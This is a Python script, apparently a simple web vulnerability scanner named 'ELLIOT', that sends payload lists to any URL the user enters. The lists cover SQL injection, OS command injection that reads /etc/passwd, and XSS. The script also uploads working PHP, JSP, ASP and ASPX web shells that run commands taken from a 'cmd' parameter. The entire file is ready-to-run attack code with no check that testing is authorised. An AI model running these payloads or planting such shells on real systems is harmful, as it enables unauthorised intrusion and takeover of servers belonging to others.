import requests

# Define payloads for different types of vulnerabilities
sql_payloads = [
    "' OR '1'='1",
    "' OR '1'='1' -- ",
    "' OR '1'='1' ({",
    "' OR '1'='1' /*",
    "' OR 1=1 -- ",
    "' OR 1=1#",
    "' OR 1=1/*",
    "' OR 1=1; --",
    "' OR 'a'='a",
    "' OR 'a'='a' --",
]

os_command_payloads = [
    '&& ls',
    '&& cat /etc/passwd',
    '| ls',
    '| cat /etc/passwd',
    '; ls',
    '; cat /etc/passwd',
    '`ls`',
    '`cat /etc/passwd`',
    '$(ls)',
    '$(cat /etc/passwd)',
]

file_upload_payloads = {
    'php_shell.php': '<?php echo shell_exec($_GET["cmd"]); ?>',
    'jsp_shell.jsp': '<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>',
    'asp_shell.asp': '<% eval request("cmd") %>',
    'aspx_shell.aspx': '<% @ Page Language="C#" %><% System.Diagnostics.Process.Start(Request.QueryString["cmd"]); %>',
}

xss_payloads = [
    '<script>alert(1)</script>',
    '<img src=x onerror=alert(1)>',
    '"><script>alert(1)</script>',
    '"><img src=x onerror=alert(1)>',
    '<svg/onload=alert(1)>',
    '<body onload=alert(1)>',
]

# Function to test SQL Injection
def test_sql_injection(url, payloads):
    vulnerable = False
    for payload in payloads:
        response = requests.get(url, params={'input': payload})
        if "SQL" in response.text or "syntax error" in response.text:
            print(f"Potential SQL Injection found with payload: {payload}")
            print(f"Response: {response.text[:200]}")  # Print a snippet of the response
            vulnerable = True
    if not vulnerable:
        print("No SQL Injection vulnerabilities found.")

# Function to test OS Command Injection
def test_os_command_injection(url, payloads):
    vulnerable = False
    for payload in payloads:
        response = requests.get(url, params={'input': payload})
        if 'root:x' in response.text or any(cmd in response.text for cmd in ['bin', 'usr', 'etc']):
            print(f"Potential OS Command Injection found with payload: {payload}")
            print(f"Response: {response.text[:200]}")  # Print a snippet of the response
            vulnerable = True
    if not vulnerable:
        print("No OS Command Injection vulnerabilities found.")

# Function to test File Upload Vulnerability
def test_file_upload(url, files):
    for filename, content in files.items():
        file = {'file': (filename, content)}
        response = requests.post(url, files=file)
        if response.status_code == 200:
            print(f"Uploaded {filename} successfully")
            print(f"Response: {response.text[:200]}")  # Print a snippet of the response
        else:
            print(f"Failed to upload {filename}")
            print(f"Response Code: {response.status_code}")

# Function to test Cross-Site Scripting (XSS)
def test_xss(url, params, payloads):
    for payload in payloads:
        for key in params.keys():
            # Inject payload into parameter
            test_params = params.copy()
            test_params[key] = payload
            # Send the request
            response = requests.get(url, params=test_params)
            # Check if the payload appears in the response
            if payload in response.text:
                print(f"Potential XSS found with payload: {payload}")
                print(f"Response snippet: {response.text[:200]}")  # Print a snippet of the response

# Main function to prompt user for input and run tests
def main():
    print("-----------------------ELLIOT-----------------------")
    while True:
        url = input("Enter the URL of the page to test: ").strip()

        print("\nSelect tests to perform:")
        print("1. SQL Injection")
        print("2. OS Command Injection")
        print("3. File Upload Vulnerability")
        print("4. Cross-Site Scripting (XSS)")
        selected_tests = input("Enter the numbers of the tests to perform, separated by commas (e.g., 1,3,4): ").split(',')

        if '1' in selected_tests:
            print("\nTesting SQL Injection...")
            test_sql_injection(url, sql_payloads)

        if '2' in selected_tests:
            print("\nTesting OS Command Injection...")
            test_os_command_injection(url, os_command_payloads)

        if '3' in selected_tests:
            print("\nTesting File Upload Vulnerability...")
            test_file_upload(url, file_upload_payloads)

        if '4' in selected_tests:
            params = {'search': 'test'}  # Adjust this according to your parameter
            print("\nTesting Cross-Site Scripting (XSS)...")
            test_xss(url, params, xss_payloads)

        another_test = input("\nDo you want to test another URL? (yes/no): ").strip().lower()
        if another_test != 'yes':
            break

if __name__ == "__main__":
    main()
